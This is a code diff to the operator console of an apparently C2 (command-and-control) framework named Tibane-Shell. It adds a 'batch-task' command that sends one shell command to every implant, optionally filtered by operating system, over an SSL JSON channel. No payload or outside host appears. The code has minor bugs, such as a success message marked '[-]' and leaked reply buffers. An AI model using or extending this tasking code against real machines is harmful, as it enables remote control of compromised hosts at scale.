@@ -52,6 +52,7 @@ const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n"
                                         "   upload [file path] : upload file to server\n"
                                         "   download [operator/implant] [file_to_download] [path to store] : download file from server\n"
                                         "   files : show all files from server\n"
+                                        "   batch-task [cmd] [os](optional) "
                                         "   quit, q, exit : exit the program\n" 
                                         "   \n---------------------------------\n";
 
@@ -86,30 +87,19 @@ class Communicate {
 
     public:
     Communicate();
-
     void send_json(const char *json_str);
-
     char *recv_json();
-
     bool authenticate();
-
     void quit();
-
     bool verify_id(const char* id);
-
     char *view_files(const char* dir);
-
     int file_upload(const char* path);
     int file_download(const char* filename, const char* filepath, const char* dir);
-
     void new_task(const char* id, const char* command);
-
+    bool new_batch_tasks(const char* command, const char* os);
     bool update_task(const char* id, int task_id, const char* command);
-
     char *get_info(const char* table);
-
     char *list_tasks(const char *id);
-
     char *get_response_task(const char *id, int task_id);
 
 };
@@ -371,6 +361,25 @@ void Shell::process_shell_commands(const char* cmd, Communicate com) {
             beacon_shell(id, com);
         } else if (sscanf(cmd, "use %8s", id) == 1) {
             beacon_shell(id, com);
+        }
+    } else if (strncmp(cmd, "batch-task", strlen("batch-task")) == 0)  {   
+        char command[BUFFER_SIZE] = {0};
+        char os[BUFFER_SIZE] = {0};
+        if (sscanf(cmd, "batch-task %255s %255s", command, os) == 2) {
+            // call without
+            if (com.new_batch_tasks(command, os) == false) {
+                printf("\n[-] Batch Tasks Failed\n");
+            } else {
+                printf("\n[-] Batch Tasks Success\n");
+            }
+        } else if (sscanf(cmd, "batch-task %255s", command) == 1) {
+            if (com.new_batch_tasks(command, NULL) == false) {
+                printf("\n[-] Batch Tasks Failed\n");
+            } else {
+                printf("\n[-] Batch Tasks Success\n");
+            }
+        } else {
+                printf("\n[-] Usage: batch-task [cmd] [os]\n");
         }
     } else {
          printf("%s", tibane_shell_help);
@@ -829,8 +838,10 @@ void Communicate::new_task(const char* id, const char* command) {
     send_json(info_);
     cJSON_Delete(info);
     free(info_);
-    char reply[BUFFER_SIZE];
-    SSL_read(ssl, reply, sizeof(reply)-1);
+    //char reply[BUFFER_SIZE];
+    //SSL_read(ssl, reply, sizeof(reply)-1);
+    char *reply = recv_json();
+    free(reply);
 }
 
 bool Communicate::update_task(const char* id, int task_id, const char* command) {
@@ -932,3 +943,26 @@ char* Communicate::get_response_task(const char* id , int task_id) {
     return info_container;
 }
 
+bool Communicate::new_batch_tasks(const char* command, const char* os) {
+    cJSON *info = cJSON_CreateObject();
+    if (!info) {
+        return false;
+    }
+    cJSON_AddStringToObject(info, "Info", "Batch Tasks");
+    cJSON_AddStringToObject(info, "os", os);
+    cJSON_AddStringToObject(info, "command", command);
+    char *info_ = cJSON_Print(info);
+    send_json(info_);
+    cJSON_Delete(info);
+    free(info_);
+
+    char *reply = recv_json();
+    cJSON *reply_ = cJSON_Parse(reply);
+    cJSON *x = cJSON_GetObjectItem(reply_, "Added");
+    if (cJSON_IsBool(x) == true) {
+        return true;
+    }
+
+    free(reply);
+    return false;
+}
